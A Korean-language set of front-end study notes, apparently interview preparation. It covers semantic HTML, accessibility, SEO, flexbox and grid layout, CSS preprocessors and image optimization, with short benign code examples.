## # HTML

### # 시멘틱 태그와 SEO

- 시멘틱 태그란?

  시멘틱은 의미론적이라는 단어이며 의미가 있는 태그를 얘기한다. 예를 들어 div같은 경우에 태그 이름만으로 컨텐츠를 유추하기 어렵지만
  header, nav, footer와 같은 태그는 태그 이름만으로도 컨텐츠를 유추할 수 있다. 또 검색 엔진은 태그를 기반으로 페이지 내 검색 키워드의 우선 순위를 판단하게 되므로(검색엔진의 랭킹 과정) SEO 측면에서도 시멘틱 태그를 사용하는 것이 좋고 시각장애가 있는 사용자에게 스크린 리더를 사용하여 웹 접근성을 높여줄 수 있는데 시멘틱 태그가 스크린 리더 활용에도 도움이 된다고 한다. 그렇기 때문에 시멘틱 태그를 사용하여 시멘틱 마크업을 하는 것은 여러 면에서 중요하다.

- 웹 접근성

  - 웹 접근성이란?

    장애인, 고령자 등이 웹 사이트에서 제공하는 정보에 비장애인과 동등하게 접근하고 이해할 수 있도록 보장하는 것이다. 시각, 운동성, 청각, 발작, 인지 등을 고려해야한다. 웹 접근성에 도움을 주는 기능으로는 스크린 리더, 화면 확대 도구, 음성 인식, 키보드 오버레이 등이 있다.

  - WAI-ARIA (Web Accessibility Initiative's Accessible Rich Internet Applications)

    - WAI-ARIA란?

      WAI-ARIA는 W3C 에서 정의한 기술로 웹 접근성을 향상을 의해 브라우저의 스크린 리더와 같은 보조 기술이 정보를 인식하고 사용자에게 무슨 일이 일어나고 있는지 알려주는 데 사용할 수 있는 추가 시맨틱 정보를 추가해주기 위한 기술이다. 대표적인 기술로는 role, aria-label 속성 등이 있다. 이러한 속성 등을 활용하여 스크린 리더가 해당 태그의 역할과 상태 등을 읽어낼 수 있다.

      - role

        role은 태그의 역할을 알려주는 속성(attribute)이다. role에 들어가는 값은 우리 마음대로 정하는 게 아닌 정해진 값을 사용해야 한다. tab, banner 등이 있고 MDN에서 확인해볼 수 있다. (https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Techniques) 또한 시멘틱 태그에는 왠만하면 해당 속성을 사용하지 않는 것이 좋다.

      - aria-label

        aria-label은 role의 banner나 tab처럼 값이 정해져 있는 게 아닌, 브라우저가 스크린 리더 사용자에게 전달해야 할 내용을 상황에 따라 적어야 한다. 예를 들면 “상세 페이지로 이동” 등이 될 수 있다.

      - aria-labelledby

        aria-label이 이름표를 붙여주는 것이라면, aria-labelledby는 쉽게 말해 그룹으로 묶어주는 속성이다.

- 웹 표준 이란?

  웹 표준이란 브라우저 종류 및 버전에 따른 기능 차이에 대하여 호환이 가능하도록 제시된 표준으로 웹에서 표준적으로 사용되는 기술이나 규칙을 뜻하며 표준화 단체인 W3C가 권고한 표준안에 따라 웹사이트를 작성할 때 이용하는 HTML, CSS, JavaScript 등에 대한 규정이 담겨 있다. 소스 통일화, 접근성, 호환성, 유지보수, 검색엔진 최적화 등의 이유로 웹 표준을 준수하여야 한다. 웹 표준을 준수한다는 것은 웹 표준 기술(XHTML, CSS, DOM, ECMAScript 등)을 올바르게 사용하는 것을 의미한다. 예를 들어 인라인 요소안에 블록 요소를 사용하지 않기, 태그 사용 후 필수적으로 태그 닫아주기 등이 있다.

  > - W3C : 월드 와이드 웹 표준안 개발 및 장려 조직

- SEO(Search Engine Optimization, 검색 엔진 최적화)란?

  검색 엔진 최적화는 웹사이트와 웹페이지를 검색 엔진이 쉽게 발견(디스커버리)하고, 읽어가서(크롤링), 저장 및 분류하고(인덱싱), 상위 노출(랭킹)시켜 자연 유입되는 트래픽의 양과 질을 높일 수 있도록 개선하는 작업을 말한다. 쉽게 말해 사용자가 검색 엔진에서 검색을 할 경우 검색결과에서 상위에 노출되도록 최적화하는 작업을 말한다.

- 검색 엔진의 동작 순서

  (1) 크롤링 : 탐색 및 수집하는 단계이다. 크롤러(검색봇)가 링크를 타고 돌아다니며 웹 페이지의 컨텐츠를 수집하여 검색 엔진 서버로 저장한다.

  (2) 인덱싱 : 결과 저장 및 구성하는 단계이다. 크롤링 된 컨텐츠를 주제별로 분류하여 데이터 베이스에 저장한다.

  (3) 랭킹 : 정렬하는 단계이다. 검색어와 인덱싱 된 데이터를 비교하여 관련성 높은 순서로 정렬하여 노출시킨다.

- SEO(검색 엔진 최적화) 방법 정리

  (1) SSR, SSG 등의 렌더링 방식 사용 : nextjs의 SSR, SSG 등을 활용하여 검색 봇이 최대한 많은 정보를 크롤링 할 수 있도록 한다.

  (2) 페이지 별 메타 태그 사용 : head 태그 내부의 페이지별 title, meta 태그(description, keyword 등)를 작성한다. 검색 로봇인 크롤러는 웹 페이지에 대한 정보를 메타 태그를 읽어 수집하게 되는데 이 메타 태그를 각 페이지 별로 추가함으로써 SEO 최적화를 수행하였다.

  (3) 시멘틱 마크업 : h1-h6(h1은 페이지당 하나만), header, main, footer, nav, aside, section 등 시멘틱 태그를 통해 페이지 구조를 명확하게 표현한다. 랭킹 향상에 도움이 된다.

  (4) 이미지 태그의 alt 속성 사용 : 크롤러는 이미지를 읽을 수 없기 때문에 alt 속성을 필수로 사용한다. 이미지 태그의 alt 속성 사용하면 랭킹 향상에 도움이 된다.

  (5) 페이지 로딩 속도 향상 : 페이지 로딩 속도 향상도 랭킹 향상에 도움이 된다.

  (6) https 적용 : 검색 엔진은 https를 적용한 사이트를 선호하기 때문에 https로 배포한다.

  (7) 페이지 이동 시 a 태그의 href 사용 : 페이지 이동 시 a태그의 href 속성을 활용하여 이동한다. 검색엔진은 페이지 컨텐츠를 인덱싱할 때 a태그의 href 속성을 찾아 인덱싱한다. onClick 이벤트로 페이지를 이동시키는 것보다 a태그의 href 속성을 활용하는 것이 seo에 도움이 된다.

  (8) Sitemap.xml, robots.txt사용 : sitemap.xml 파일을 생성하여 사용한다. 이 파일은 웹사이트의 모든 페이지를 구글 및 다른 검색 엔진에 제출하는 데 사용된다. 이 파일은 웹사이트의 모든 페이지, 포스트 및 기타 콘텐츠를 목록화하고 검색 엔진에서 해당 콘텐츠를 인덱싱하는 데 도움을 줘서 검색엔진에게 웹 사이트의 구조와 콘텐츠를 보다 잘 이해할 수 있도록 한다. 또한 robots.txt 파일을 사용하여 크롤러가 크롤링을 제외할 페이지를 식별하는데 도움을 줄 수 있다.

  (9) URL 구조 최적화 : URL 구조를 깔끔하고 의미있게 사용한다.

  (10) 구글 서치 콘솔 사용 : 구글 서치 콘솔을 사용하여 사용자들이 어떤 키워드로 유입되었는지 파악하고 메타 태그를 개선한다.

<br>

### # ul / ol / dl 차이

- ul

  Unoerdered List 의 약자로 순서가 없는 목록이다. li와 함께 사용된다.

- ol

  Ordered List 의 약자로 순서가 있는 목록이다. li와 함께 사용된다.

- dl

  Difinition List 의 약자로 정의 목록을 만드는 형식이다. dt, dd을 함께 사용한다.

<br>

### # display 속성, block / inline / inline block

- display: block

  모든 width를 다 차지한다. div, p, li 등이 있다.

- display: inline

  자기 영역만큼만 width를 차지하며 width, height, margin, padding-top, padding-bottom, line-height 속성을 사용할 수 없다.
  span, a, img 등이 있다.

- display: inline-block

  자기 영역만큼만 width를 차지하며 width, height, margin, padding-top, padding-bottom, line-height 속성을 사용할 수 있다.
  button, input, select 등이 있다.

<br>

### # script 태그를 HTML 파일에서 body 태그 아래에 위치시키는 이유

- HTML 파싱 중 script 태그를 만나면 중단 시점이 생기고 그만큼 Display에 표시되는 것이 지연된다.
  만약 script 태그로 js 파일을 가져온다면 js 파일을 다운로드하고 실행한 뒤 다시 HTML 파싱을 이어서 실행하는 것이다.
  또 이런 방식으로 동작하게 된다면 DOM 트리가 생성되기전에 로드 된 자바스크립트가 실행되면서 생성되지도 않은 DOM의 조작을 시도하는 문제가 발생할 수도 있다. 그렇기 때문에 script태그는 body 태그 최하단에 위치하는게 좋다. 만약 script 태그를 꼭 상단에 위치시켜야 한다면 async나 defer 키워드를 통해 문제를 해결할 수 있다. async는 html 파싱 과정 중 비동기적으로 js 파일을 다운로드 받고 html 파싱 완료 여부와 관계없이 js 파일을 실행한다. 반면 defer은 html 파싱 과정 중 비동기적으로 js 파일을 다운로드만 받고 html 파싱 완료 후 js 파일을 실행한다. defer이 가장 좋은 옵션이다.

  ```html
  <script src="main.js" defer></script>
  ```

<br>

### # 태그 속성 ID 선택자와 Class 선택자

- id(#)는 유니크하고 class(.)는 중복 사용이 가능하다.

<br>

### # HTML 파일 최상단에 `<!DOCTYPE html>`를 표기하는 이유

- HTML은 버전 별로 지원하는 태그가 다르기 때문에 HTML이 작성된 버전 정보를 미리 선언해 웹브라우저가 내용을 올바로 표시할 수 있도록 해주는 것이다. `<!DOCTYPE html>`과 같이 마크업 언어에서 문서 형식을 정의하는 메타 언어를 DTD(Document Type Definition)라고 한다. 선언 위치는 문서 최상단에 위치해야하며 생략될 경우 쿼크모드로 렌더링되어 같은 태그라도 브라우저마다 다르게 표시하여 크로스 브라우징 오류가 발생할 수 있다. HTML5에서는 `<!DOCTYPE html>`과 같이 DOCTYPE을 선언해주어야 한다.

<br>

### # 브라우저 렌더링 모드, 표준모드와 쿼크모드

- 웹 브라우저는 두 가지 렌더링 모드를 지니고 있는데 표준 모드와 쿼크모드이다. 렌더링 모드는 문서 최상단 DOCTYPE을 보고 결정하게 된다. 이 선택하는 과정을 독타입 스니핑, 독타입 스위칭이라고 한다. 브라우저가 출력하고자 하는 문서가 최신이라고 판단하면 표준모드(W3C 표준을 준수한 모드)로 렌더링을 하게 된다. 반대로 예전 문서라고 판단을 하면 쿼크 모드(W3C 표준을 준수하지 않은 모드)로 렌더링을 하게 된다. 쿼크모드의 목적은 오래된 웹페이지들이 최신 버전의 브라우저에서 깨져 보이지 않으려는 것에 있다.

<br>

### # `data-*` 속성

- HTML5에서는 데이터 속성이 추가되었다. 이 속성은 특정한 데이터를 DOM 요소에 저장하기 위한 목적으로 사용된다. 데이터 속성을 사용하면 이전처럼 hidden으로 태그를 숨겨두고 데이터를 저장할 필요가 없어 HTML 스크립트가 간결해진다. 데이터 속성을 추가한 후 dataset을 통해 확인해보면 DOMStringMap으로 데이터 속성을 가지고 있는 것을 확인할 수 있다.

<br>

### # attribute와 property의 차이점

- attribute는 HTML 문서에서의 정적인 속성을 말하고 property는 DOM tree 에서의 동적인 속성을 말하며 javascript에 의해 언제든지 변경될 수 있다. 만약 `<div className="hi" />`라는 태그를 생성한다고 했을 때 HTML 문서 안에 있는 className이 attribute, DOM tree 안에 있는 className이 property가 된다. 즉 같은 속성을 가리키기는 하지만 이 두 가지의 차이점은 저장 되는 위치에 있다.

<br>

### # 캔버스 관련 작업 경험

- 우선 canvas 태그는 그래프, 도형, 이미지들을 그릴 수 있는 html5의 요소라고 알고 있다. 캔버스 태그 관련 로직을 직접 구현한 것은 아니지만 이전 프로젝트에서 사용하고 있었다. 사용자가 프로필 이미지 업로드 시 업로드 전 이미지를 리사이징 하기 위해 사용하였었다.

  ```javascript
  // 이미지 리사이징 사용 예시
  const resizeImage = (
    imageBlob: File | undefined,
    imageType: ImageItemType,
  ): Promise<Blob | null> => {
    return new Promise(resolve => {
      if (imageBlob) {
        const { width } = getImageResizePreset(imageType);
        const image = document.createElement('img');
        const imageUrl = URL.createObjectURL(imageBlob);

        image.setAttribute('src', imageUrl);
        image.addEventListener('load', () => {
          const { height: imgHeight, width: imgWidth } = image;
          const height = (imgHeight * width!) / imgWidth;
          const canvas = document.createElement('canvas');
          canvas.width = width!;
          canvas.height = height!;
          const ctx = canvas.getContext('2d');
          ctx?.drawImage(image, 0, 0, width!, height!);
          ctx?.canvas.toBlob(blob => resolve(blob), 'image/png', 0.75);
        });
      }
    });
  };
  ```

<br><br><br>

## # CSS

<br>

### # CSS 전처리기

- CSS 전처리기란?

  CSS 전처리기란 자신만의 특별한 syntax를 가지고 CSS를 생성하도록 하는 프로그램을 말한다. 대표적인 CSS 전처리기로는 Sass, Less, Stylus 등이 있다. 하지만 CSS 자체가 발전하면서 전처리기의 의존도는 줄어들고 있다.

- CSS 전처리기가 만들어진 이유

  웹 페이지가 점점 크고 복잡해지면서 불필요한 선택자의 과한 사용과 구조가 명확하게 구분되지 않아 가독성이 떨어지고 유지보수를 어렵게 하여 이를 보완하기 위해 등장하였다.

- CSS 전처리기 장단점

  - 장점

    (1) 재사용성 증가로 인한 개발 시간 단축 : 변수 및 Mixins의 사용으로 일관된 테마를 사용하므로 재사용성이 증가하고 개발 시간이 단축된다.

    (2) 유지관리 : Nesting을 통해 구조가 명확해져 유지보수가 용이해지고 여러 파일로 나누어 관리가 가능해 짐, 이 경우 일반 css도 가능하지만 서버에서 불러오는 파일이 css 전처리기에 경우 컴파일된 1개의 스타일시트만 불러오게 된다.

    (3) 구문 차이 평준화 : 정해진 룰에 따라 작업하기 떄문에 협업 시 구문의 수준 차이를 평준화

  - 단점 (전컴)

    (1) 전처리기 도구 필요 : 전처리기를 위한 도구 필요

    (2) 컴파일 과정 추가 : CSS로 컴파일하는 과정이 추가 됨

- Sass를 사용하는 이유

  전부 다 사용해보지 않은 상태에서 Sass를 선택하게 되었다. 서칭을 통해 세 가지의 장단점을 확인해보고 선택하게 되었다. Less같은 경우 Sass에 비해 제공하는 기능에 한계가 있으며 Stylus는 Sass와 Less에 비해 비교적 늦게 나왔기 때문에 컴파일 후 사소한 버그가 생기는 경우가 있다고 한다. 그에 비해 Sass는 가장 오래되어 상대적으로 안정적이며 가장 활발히 개발되고 있다고 한다. 또 친숙한 문법과 다양한 기능을 제공하기 때문에 Sass를 선택하게 되었다.

- SCSS를 모듈로 사용한 이유

  클래스가 겹치지 않도록 관리해야하는 문제를 해결하기 위해 CSS Modules을 사용하여 고유한 해시 문자열을 추가해 CSS 속성이 겹치지 않도록 하기 위해 사용하였다.

- SCSS, SASS 차이는?

  (1) 문법 차이 : SASS는 들여 쓰기+줄 바꿈 형식, SCSS는 중괄호+세미콜론 형식 사용

  (2) 호환성 : SASS보다 SCSS가 CSS와의 호환성이 더 좋다

<br>

### # SCSS vs styled-components

- 각각의 차이점 (속파동시문클)

  (1) 실행 속도 : scss는 css파일이 추출되므로 자바스크립트 해석 과정이 필요 없고 styled-components는 자바스크립트 해석 과정이 필요하기 때문에 속도가 더 늦다.

  (2) 스타일 작성 파일 : scss는 css-in-css로 css파일에 작성되고, styled-components는 css-in-js로 js파일에 작성된다.

  (3) 동적 스타일링 : scss는 동적 스타일링이 어렵고 styled-components는 편하다.

  (4) 스타일 정보를 읽는 시점 : scss는 서버에서 컴파일된 1개의 스타일 시트를 불러와 html 문서에 읽혀져 있는 상태이며 styled-components는 컴포넌트가 렌더링 될 때만 해당 스타일 정보를 읽는다.

  (5) 문법 차이 : scss는 친숙한 문법이고 styled-components는 상대적으로 생소한 문법이다.

  (6) 클래스 사용 여부 : scss는 클래스를 일일히 지정해야하고 styled-components는 지정하지 않아도 된다.

<br>

### # CSS framework 사용경험

- 유명한 css 프레임워크로는 부트스트랩, 메터리얼UI, 테일윈드CSS 등이 있는 것으로 알고 있고 이 중 MUI를 사용해보았다. css 프레임워크를 사용하는 이유로는 빠르고 일관적인 스타일링과 프로젝트 유지 보수 시 빠른 캐치업이 가능하기 때문에 사용하는 것으로 알고 있다.

<br>

### # 반응형

- 반응형이란?

  반응형 웹이란 하나의 웹사이트에서 PC, 태블릿, 모바일 등 접속하는 디스플레이의 종류에 따라 크기가 자동으로 변하게 만든 웹페이지 접근 기법을 말한다.

- 반응형 웹의 3요소

  (1) 미디어 쿼리(Media query) : media 크기의 범위를 지정하여 css를 동적으로 설정한다. 미디어쿼리는 모바일 퍼스트 방식이 더 편리하다. 모바일 퍼스트 방식은 모바일을 기준으로 스타일을 작성하여 점점 확장해나가는 방식인데 적은 스타일에 필요한 스타일을 추가해나가는 것이 더 편리하기 때문에 모바일 퍼스트 방식이 더 편리한 방식이다. max-width(~px 이하에서 적용되는 속성) 대신 min-width(~px 이상에서 적용되는 속성)로 바꾸면 된다.

  (2) 유연한 레이아웃(Fluid Layout) : 웹 페이지의 요소들이 고정된 너비 대신 백분율(%) 또는 vw, vh와 같은 상대적인 단위를 사용하여 크기를 조정하도록 설정하는 방법으로 media 크기에 따라 그리드가 동적으로 변하도록 설정하는 것이다.

  (3) 유동적인 이미지(Flexible Images) : 유동적인 이미지는 이미지가 화면 크기에 맞춰 자동으로 크기가 조정되도록 만드는 방법이다. 이를 위해 max-width를 100% 사용하여 이미지가 부모 요소의 너비를 넘지 않도록 설정한다. 주의할 점은 모든 화면에서 볼 수 있는 적절한 크기의 이미지를 사용해야한다는 점이다.

- 적응형과 반응형의 차이를 아는가?

  반응형 웹은 하나의 템플릿을 사용해 모든 기기에 대응하는데 반해, 적응형 웹은 선별된 기기 유형에 따라 별도의 독립적인 템플릿이 요구한다. 반응형은 하나의 템플릿을 사용하므로 개발이 상대적으로 간편하다는 장점이 있지만 속도는 사용자 기기에 맞는 템플릿과 css만 다운로드하는 적응형이 더 빠르다.

<br>

### # display flex

- display flex

  display에 flex를 적용하여 flex container를 만들 수 있다.

- flex-direction

  flex container 내부에 flex item이 배치 방향을 설정한다. 디폴트 값은 row이다. 속성의 종류로는 row, column 등이 있다.

- justify-contents

  가로 축을 기준으로 flex item에 배치를 결정한다. 속성의 종류로는 flex-start, flex-end, center, space-between 등이 있다.

- align-items

  세로 축을 기준으로 flex item에 배치를 결정한다. 속성의 종류로는 stretch, flex-start, flex-end, center 등이 있다.

- flex-wrap

  flex item이 flex container를 넘어갈 때 줄바꿈 처리를 어떻게 할지 결정한다. 속성의 종류로는 nowrap, wrap 등이 있다.

- align-content

  줄바꿈이 허용된 상태에서 flex item이 두 줄 이상이 되었을 때 세로 축을 기준으로 flex item에 배치를 결정한다.

- flex-basis

  flex item에 기본 크기(ex px)를 지정한다. 0인 경우 flex-grow에 따라 크기가 동적으로 결정된다.

- flex-grow

  flex-grow는 컨테이너에 남는 공간이 있을 때 내부 flex item이 커질 비율을 지정한다. 디폴트 값은 0이며 0이 아닌 경우의 값은 flex-basis 값을 제외한 여백을 나눠갖는 비율이다.

  ```html
  <!-- container에 남는 공간이 300px인 경우, A는 100px B는 200px -->
  <div class="container">
    <div class="item" style="flex-grow: 1">A</div>
    <div class="item" style="flex-grow: 2">B</div>
  </div>
  ```

- flex-shrink

  flex-shrink는 컨테이너에 공간이 부족할 때 내부 flex item이 작아질 비율을 지정한다. 디폴트 값은 1이며 1이 아닌 경우의 값은 줄어드는 비율이다. 0으로 설정할 경우 flex-basis보다 작아지지 않기 때문에 고정 폭의 컬럼을 만들 수 있다.

  ```html
  <!-- container에 공간이 부족할 때 B가 A보다 더 많이 줄어든다 (비율 1:2) -->
  <div class="container">
    <div class="item" style="flex-shrink: 1">A</div>
    <div class="item" style="flex-shrink: 2">B</div>
  </div>
  ```

- flex

  flex-grow, flex-shrink, flex-basis를 한 번에 쓸 수 있는 축약형 속성이다. flex-grow, flex-shrink, flex-basis 순으로 속성을 부여한다. (ex flex 1 1 200px, flex 1 -> flex 1 1 0의 단축 속성)

<br>

### # display grid

- grid와 flex의 차이

  flex는 한 방향 레이아웃 시스템 (1차원)이고 grid는 두 방향(가로-세로) 레이아웃 시스템 (2차원)이다.

- grid 영역 구분

  컨테이너 -> 셀 -> 아이템 순으로 존재하며 셀 사이에는 가로 세로의 개별 번호를 가진 그리드 라인이 존재

- 그리드 용어

  - 그리드 컨테이너 (Grid Container)

    `display: grid`를 적용하는, Grid의 전체 영역이다. Grid 컨테이너 안의 요소들이 Grid 규칙의 영향을 받아 정렬된다고 생각하면 된다.

  - 그리드 아이템 (Grid Item)

    Grid 컨테이너의 자식 요소들이다. 바로 이 아이템들이 Grid 규칙에 의해 배치되는 것이다. `display: grid`를 적용한 요소의 `children`을 말한다.

  - 그리드 트랙 (Grid Track)

    Grid의 행(Row) 또는 열(Column)

  - 그리드 셀 (Grid Cell)

    Grid의 한 칸을 가리킨다. `display: grid`를 적용한 요소의 `children`과 같이 `<div>`같은 실제 html 요소는 그리드 아이템이고, 이런 Grid 아이템 하나가 들어가는 “가상의 칸(틀)”이라고 생각하면 된다.

  - 그리드 라인(Grid Line)

    Grid 셀을 구분하는 선이다.

  - 그리드 번호(Grid Number)

    Grid 라인의 각 번호이다.

  - 그리드 갭(Grid Gap)

    Grid 셀 사이의 간격이다.

  - 그리드 영역(Grid Area)

    Grid 라인으로 둘러싸인 사각형 영역으로, 그리드 셀의 집합이다.

- 그리드 속성

  - `display: grid`

    `grid 컨테이너에 적용하는 속성`이다. 해당 속성을 적용시킨 후 다른 gird 속성을 활용하여 그리드 컨테이너 요소의 자식 요소인 그리드 아이템 요소에 grid 규칙을 적용시킬 수 있다. `display: inline-grid` 속성도 있는데, 이건 block과 inline-block의 관계를 생각하면 된다. 아이템의 배치와 관련이 있다기 보다는, 컨테이너가 주변 요소들과 어떻게 어우러질지 결정하는 값이다. inline-grid는 inline-block처럼 동작한다.

  - grid-template-rows, grid-template-columns

    컨테이너에 지정해주는 속성이며 Grid 트랙의 크기들을 지정해주는 속성이다. grid-template-rows는 행(row)방향, grid-template-columns은 열(column)방향의 크기를 지정한다.

    - fr(fraction) 속성

      숫자 비율대로 트랙의 크기를 나눈다. 즉 위의 1fr 1fr 1fr은 균일하게 1:1:1 비율을 지정한다는 의미이다. 비율로 공간을 분배하기 위해 사용한다.

    - repeat 함수 속성

      반복되는 값을 자동으로 처리할 수 있는 함수이다. 첫번째 인자는 수이고 두번째 인자는 반복되는 값을 전달해주면 된다.

      ```css
      .container {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        grid-template-rows: auto;
      }
      ```

    - minmax 함수 속성

      최솟값과 최댓값을 지정할 수 있는 함수이다. 예를 들어 minmax(100px, auto)의 의미는 최소한 100px, 최대는 자동으로(auto) 늘어나도록 한 것이다.

  - auto-fill과 auto-fit

    column의 개수를 미리 정하지 않고 설정된 너비가 허용하는 한 최대한 셀을 채운다. 만약 9개의 children을 가지는 부모 컨테이너에 `grid-template-columns: repeat(auto-fill, minmax(20%, auto))`과 같은 값을 지정하게 되면 두 개의 row와 다섯 개의 column을 가지는 레이아웃이 생성된다. 이 때 가장 끝 셀은 비어있게 된다. 왜냐하면 컬럼의 최소 크기를 20%로 지정해주었기 때문에 그리드 아이템은 로우 당 5개씩 아이템이 배치되고 두 번째 로우에는 4개의 아이템만 배치되게 된다. 이 때 auto-fit을 사용하면 나머지 셀의 크기를 균등하게 늘려 비어있는 셀을 채우게 된다. 또 auto-fill이나 auto-fit을 적용시킨 상태로 셀 크기를 px로 지정하면 브라우저 크기에 따라 레이아웃이 변경되도록 지정할 수 있다.

    ```css
    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    ```

  - row-gap, column-gap, gap

    셀 사이의 간격을 만든다.

  - grid-auto-columns, grid-auto-rows

    grid-template-columns, grid-template-rows의 통제를 벗어난 위치에 있는 트랙의 크기를 지정하는 속성이다. 예를 들어 children을 9개 가지고 있는 컨테이너에 grid-template-rows: repeat(3, minmax(50px, auto))와 같이 속성을 지정한다면 나머지 6개의 요소는 통제를 벗어난 위치에 있는 트랙이 되는 것이다. 이 때 grid-auto-rows: minmax(50px, auto)과 같이 해당 속성을 단독으로 사용하면 모든 트랙의 크기를 지정해줄 수 있다. 그리드 아이템 갯수를 미리 알 수 없을 때 유용하다.

    ```css
    .container {
      display: grid;
      grid-template-columns: 200px;
      grid-auto-columns: 100px;
      grid-auto-flow: column;
    }
    ```

    ```html
    <div class="container">
      <!-- 200px, 첫 번째 아이템 → 명시된 첫 번째 열 (200px) -->
      <div>1</div>
      <!-- 100px, 두 번째, 세 번째 아이템 → 자동으로 생긴 열 → grid-auto-columns: 100px -->
      <div>2</div>
      <!-- 100px -->
      <div>3</div>
    </div>
    ```

  - grid-column-start, grid-column-end, grid-column, grid-row-start, grid-row-end, grid-row

    이 속성들은 Grid 아이템에 적용하는 속성으로, Grid 아이템에 시작 위치와 끝 위치를 결정한다. 그리드 영역에는 그리드 라인 번호가 매겨져 있는데, 바로 그 번호를 이용해서 column과 row의 범위를 결정하는 것이다. 예를 들어 `grid-column: 1 / span 2` 속성을 지정하면 해당 Grid 아이템은 1번 그리드 라인이 시작 위치가 되고 Grid 아이템을 2칸 차지하는 영역이 끝 위치가 된다.

  - grid-template-areas

    각 영역(Grid Area)에 이름을 붙이고, 그 이름을 이용해서 배치하는 방법이다.

  - grid-auto-flow

    전체 아이템이 자동 배치되는 흐름을 결정하는 속성이다. 초기 속성은 행 방향 배치인 row이고, 열 방향 배치 속성인 column, 빈 셀 채우는 속성인 dense, 행 방향 배치와 빈 셀을 채우는 속성인 row dense, 열 방향 배치와 빈 셀을 채우는 속성인 column dense 등이 있다.

    ```css
    .container {
      display: grid;
      grid-template-columns: repeat(3, 100px);
      grid-auto-flow: row;
    }
    ```

    ```html
    <div class="container">
      <div>1</div>
      <div>2</div>
      <div>3</div>
      <!-- 다음 줄로 내려감 -->
      <div>4</div>
    </div>
    ```

  - align-items, justify-items

    align-items과 justify-items은 컨테이너에 적용되는 속성으로 셀 안에서 그리드 아이템들의 정렬 방식을 지정한다. align-items은 세로(column축) 방향, justify-items은 가로(row축) 방향을 지정할 수 있다. 기본 값은 stretch로 셀 내부에 꽉 차게 적용되고 축의 시작점부터 정렬 되는 start, 축의 중심점부터 정렬되는 center, 축의 끝점부터 정렬되는 end 등의 속성이 있다. 또 place-items이라는 축약형 속성으로 align-items과 justify-items을 한번에 지정해줄 수 있다. 해당 속성은 그리드 셀 내부 그리드 아이템들이 그리드 셀 내부에서 어떻게 배치되는지를 결정한다. 즉, 셀 위치에 영향을 주지 않고 셀 내부 아이템 위치에만 영향을 준다.

  - align-content, justify-content

    Grid 아이템들의 크기를 모두 합한 값이 Grid 컨테이너의 크기보다 작을 때 Grid 아이템들을 통째로 정렬한다. align-content은 세로(column축) 방향으로 그룹 정렬하는데 그리드 아이템들의 높이 합이 컨테이너 높이보다 작을 때 적용되고, justify-content은 가로(row축) 방향으로 그룹 정렬하는데 그리드 아이템들의 폭 합이 컨테이너 폭보다 작을 떄 적용된다. 기본 값은 stretch로 컨테이너 내부에 꽉 차게 적용되고 컨테이너 시작점부터 정렬되는 start, 컨테이너 중심점부터 정렬되는 center, 컨테이너 끝점부터 정렬되는 end, 그리드 아이템 사이에 균일한 간격을 두고 정렬되는 space-between, 그리드 아이템 둘레에 균일한 간격을 두고 정렬되는 space-around, 그리드 아이템 사이와 양 끝에 균일한 간격을 두고 정렬되는 space-evenly 속성 등이 있다. 또 place-content이라는 축약형 속성으로 align-content과 justify-content를 한번에 지정해줄 수 있다. 해당 속성은 그리드 컨테이너 내부 그리드 셀들이 어떻게 밷치되는지 결정한다. items 속성과는 다르게 셀 위치에 영향을 주고 셀 내부 아이템에는 영향을 주지 않는다.

  - align-self, justify-self

    그리드 아이템에 적용하는 속성으로 개별 아이템을 정렬할 수 있다. align-content와 justify-content와의 차이는 그리드 아이템 개별로 적용시킬 때 사용하는 속성이라는 것이다. 사용 방법은 동일하지만 개별로 동작하므로 stretch, start, center, end 속성만 존재한다. 또 place-self 축약형 속성으로 align-self justify-self를 한번에 지정해줄 수 있다.

  - order

    시각적 나열 순서를 결정하는 속성이다. 숫자 값이 들어가며 작은 숫자일 수록 먼저 배치된다. 시각적으로 변경되는 것일 뿐 HTML 자체 구조를 바꾸는 것은 아니므로 접근성 측면에서 사용에 주의하여야한다. 시각 장애인분들이 사용하는 스크린 리더로 화면을 읽을 때 order를 이용해 순서를 바꾼 것은 의미가 없다는 것이다.

  - z-index

    z-index로 Z축 정렬을 할 수 있다. 숫자가 클 수록 위로 올라온다. position에서의 z-index와 같은 개념이다.

<br>

### # before, after

- 가상 요소를 만들 때 사용하며 태그를 직접 추가하지 않고 장식 요소를 추가할 때 사용한다. 해당 속성을 사용함으로써 의미없는 태그를 추가하지 않아도 된다.

<br>

### # 이미지 파일 최적화 방법

- 이미지 크기 조절

  사용자에게 보여줄 너비를 고려하여 이미지 크기를 조절해 파일 용량을 줄인다.

- 이미지 포맷 변경

  avif와 같은 압축률이 좋은 이미지 포맷으로 변경한다. 단 지원하지 않는 브라우저를 고려하여 대체 이미지 처리가 필요하다. 예를 들어 picture 태그, source 태그, img 태그를 함께 사용하여 source 태그 이미지에 문제가 있는 경우 img 태그의 이미지를 fallback과 같이 사용할 수 있다. 또한 nextjs의 경우 이미지 최적화 모듈이 이미지 요청 헤더에 accept 필드에 있는 지원 가능한 이미지 포맷을 보고 알아서 변경해주기 때문에 크로스 브라우징 이슈에 유리하다.

  ```html
  <picture>
    <source srcset="image.avif" type="image/avif" />
    <source srcset="image.webp" type="image/webp" />
    <!-- source 태그 이미지의 문제가 있는 경우 아래 img 태그 이미지 노출, fallback 역할. source 태그에 media 속성을 활용하여 반응형도 이러한 방식으로 처리 가능 -->
    <img src="image.jpg" alt="description" />
  </picture>
  ```

- 디바이스 크기별 이미지 설정

  img 태그의 srcset 속성과 sizes 속성을 활용하여 디바이스 크기별 이미지를 설정한다. sizes 속성은 미디어쿼리와 같이 뷰포트 크기별로 이미지가 보여질 크기를 지정해줄 수 있고 srcset 속성을 통해 여러가지 크기의 이미지를 나열해놓을 수 있다. 예를 들어 현재 뷰포트 크기가 sizes 속성에 할당한 뷰포트 크기에 포함되는 경우 해당 뷰포트에서 보여질 이미지 영역 크기에 맞는 이미지를 srcset 속성에서 찾아 띄워주는 것이다. 디폴트 속성은 기존 사용하는 src 속성을 통해 지정해줄 수 있다.

  ```html
  <img
    srcset="images/500.png 500w, images/300.png 300w, images/150.png 150w"
    sizes="(min-width:960px) 500px, (min-width:640px) 300px, 320px"
    src="images/150.png"
    alt="gray-box"
  />
  ```

- 고정 값 설정

  치수가 없는 이미지들은 Reflow를 발생시켜 퍼포먼스를 저하시키고 CLS (Cumulative Layout Shift) 점수에 영향을 줘서 SEO에도 영향을 미친다. 그렇기 때문에 img 태그에 크기를 설정해준다.

